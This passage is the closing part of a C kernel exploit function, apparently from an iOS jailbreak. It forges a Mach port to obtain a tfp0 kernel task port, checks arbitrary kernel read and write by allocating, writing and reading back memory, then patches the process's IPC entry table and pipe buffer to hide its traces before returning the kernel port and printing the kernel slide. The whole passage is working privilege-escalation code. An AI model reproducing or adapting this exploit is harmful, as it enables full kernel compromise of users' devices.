        kwritebuf_sp(new_addr, (const void*)(kport10_t *)fakeport_addr, sizeof(kport_t));
        
        printf("[*] testing new tfp0 port\n");
        
        init_kernel_memory(new_tfp0, self_port_addr);
        
        addr = kalloc(8);
        if (!addr) {
            printf("[-] seems like the new tfp0 port didn't work?\n");
            goto err;
        }
        
        printf("[+] new_tfp0: 0x%x\n", new_tfp0);
        printf("[*] allocated: 0x%llx\n", addr);
        kwrite64_sp(addr, 0x4141414141414141);
        readb = kread64_sp(addr);
        kfree(addr, 8);
        printf("[*] read back: 0x%llx\n", readb);
        
        if (readb != 0x4141414141414141) {
            printf("[-] read back value didn't match\n");
            goto err;
        }
    }
    
    // clean up port
    addr_t task_addr = kreadptr_sp(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    addr_t itk_space = kreadptr_sp(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    addr_t is_table = kreadptr_sp(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = our_port >> 8;
    
#ifdef __LP64__
    const int sizeof_ipc_entry_t = 0x18;
#else
    const int sizeof_ipc_entry_t = 0x10;
#endif
    
    kwrite32_sp(is_table + (port_index * sizeof_ipc_entry_t) + sizeof(addr_t), 0);
    kwriteptr_sp(is_table + (port_index * sizeof_ipc_entry_t), 0);

    kwriteptr_sp(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER), 0); // freed already via mach_msg()
    
#ifndef __LP64__
    uint32_t incomplete_port_index = new_fake_port >> 8;
    
    kwrite32_sp(is_table + (incomplete_port_index * sizeof_ipc_entry_t) + sizeof(addr_t), 0);
    kwriteptr_sp(is_table + (incomplete_port_index * sizeof_ipc_entry_t), 0);
    
    kfree(faketask, FAKE_TASK_SIZE);
#endif
    
    if (fds[0] > 0)  close(fds[0]);
    if (fds[1] > 0)  close(fds[1]);
    if (port_fds[0] > 0)  close(port_fds[0]);
    if (port_fds[1] > 0)  close(port_fds[1]);
    
    if(islegacy()) {
        free((void *)(kport_t *)fakeport_addr);
        printf("[i] kernel slide: " ADDR"\n", get_kslide_anchor());
        return ktask;
    } else {
        free((void *)(kport10_t *)fakeport_addr);
        printf("[i] kernel slide: " ADDR"\n", get_kslide_new());
        deinit_IOSurface();
        return new_tfp0;
    }
    
err:
    if (port_fds[0] > 0)  close(port_fds[0]);
    if (port_fds[1] > 0)  close(port_fds[1]);
    
    return MACH_PORT_NULL;
}
